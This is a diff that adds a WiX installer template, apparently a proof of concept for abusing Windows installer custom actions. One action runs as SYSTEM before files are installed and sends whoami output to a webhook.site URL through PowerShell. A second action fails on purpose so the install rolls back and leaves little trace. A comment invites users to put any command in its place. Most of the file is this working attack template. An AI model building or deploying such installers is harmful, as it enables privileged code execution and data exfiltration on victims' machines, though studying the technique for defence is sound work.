@@ -1,0 +1,19 @@
+﻿<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
+  <Package Name="InstallMe" Manufacturer="InstallMe Limited" Version="1.0.0.0" UpgradeCode="25f80f0d-6dad-4570-9e4e-b0276ee51efa" Scope="perMachine">
+    <MajorUpgrade DowngradeErrorMessage="!(loc.DowngradeError)" />
+    <MediaTemplate EmbedCab="yes"/>
+
+    <!-- Add any command to execute here -->
+    <CustomAction Id="RunMe" Impersonate="no" Execute="deferred" Directory="System64Folder" ExeCommand='cmd.exe /c &quot;powershell.exe iwr https://webhook.site/50633f33-8b8e-4252-9879-4f1053e93fdb/$$(whoami)&quot;' Return="check" />
+    <CustomAction Id="AllwaysFail" Impersonate="no" Execute="deferred" Directory="INSTALLFOLDER" ExeCommand="blahblah" Return="check" />
+
+    <InstallExecuteSequence>
+      <Custom Action="RunMe" Before="InstallFiles"/>
+      <Custom Action="AllwaysFail" After="RunMe"/>
+    </InstallExecuteSequence>
+
+    <Feature Id="Main">
+      <ComponentGroupRef Id="InstallComponents" />
+    </Feature>
+  </Package>
+</Wix>
